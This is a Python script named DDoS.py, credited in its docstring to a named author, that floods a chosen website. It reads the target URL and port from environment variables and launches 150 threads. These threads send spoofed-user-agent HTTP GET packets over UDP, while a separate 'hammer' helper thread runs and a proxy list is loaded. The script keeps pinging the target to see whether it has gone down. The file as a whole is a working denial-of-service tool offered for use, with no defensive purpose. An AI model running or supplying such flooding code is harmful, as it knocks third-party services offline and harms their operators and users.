"""
DDoS.py:
    Attacking websites using saved configures.
    You can set url and port environment variables manually and run this script for attacking...
    $ export url='http://example.com'
    $ export port='80'
    $ python DDoS.py

    or you can use script by importing it after setting environment variables:
    >>> import os
    >>> os.environ['url'] ='http://example.com'
    >>> os.environ['port'] ='80'
    >>> import DDoS

    :author
        A. M. Joshaghani
    :website
        https://amjoshaghani.ir
"""
import threading
import socket
import os
import termcolor
import time
import sys
import requests
import random
import hammer
from itertools import cycle


def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)


def user_agent():
    uagent = []
    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append(
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    uagent.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
    return uagent


def get_ip(hostname):
    return socket.gethostbyname(hostname.replace('https://', '').replace('http://', ''))


siteUrl = os.getenv('url')
sitePort = int(os.getenv('port'))
attacks = 0
errors = 0
with open(resource_path("proxies.txt")) as f:
    list_proxy = f.read().splitlines()
proxy_cycle = cycle(list_proxy)
proxy = next(proxy_cycle)

print(termcolor.colored(f"Start on {siteUrl}:{sitePort}", 'magenta'))


def attack():
    global attacks, errors
    while 1:
        uagent = user_agent()
        data = """Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 115
Connection: keep-alive"""
        packet = str(
            "GET / HTTP/1.1\nHost: " + siteUrl + "\n\n User-Agent: " + random.choice(uagent) + "\n" + data).encode(
            'utf-8')
        #udp = socket.getprotobyname('udp')
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect((siteUrl.replace("https://", "").replace("http://", ""), int(sitePort)))
            if s.sendto(packet, (siteUrl.replace("https://", "").replace("http://", ""), sitePort)):
                print(termcolor.colored(f"Package was sent to {siteUrl}:{sitePort} [{attacks}]", color='blue'))
                time.sleep(.5)
                s.shutdown(1)
                attacks += 1
            else:
                print(termcolor.colored(f"Failed to send package to {siteUrl}:{sitePort}", 'red'))
                errors += 1

        except socket.error as e:
            print(termcolor.colored(f"WHOA!!!! server had no response. it may be down!!", 'green'))

        try:
            if requests.get(os.getenv('url')).ok:  # , proxies={"http": proxy, "https": proxy}
                print(termcolor.colored(f"{siteUrl}:{sitePort} pinged successfully!", 'cyan'))
                time.sleep(.5)
            else:
                errors += 1
                print(termcolor.colored(f"no response from {siteUrl}:{sitePort}. errors count: {errors}", 'red'))

        except KeyboardInterrupt:
            print("Exiting...")
            sys.exit()

        time.sleep(.1)
        continue


try:
    print("Starting hammer helper script...")
    time.sleep(2)
    hammer = threading.Thread(target=hammer.Hammer)
    hammer.start()
    print("Starting main DrDoSer script...")
    time.sleep(2)
    for i in range(150):
        thread = threading.Thread(target=attack)
        thread.start()
except KeyboardInterrupt:
    print("Exiting...")
    sys.exit()
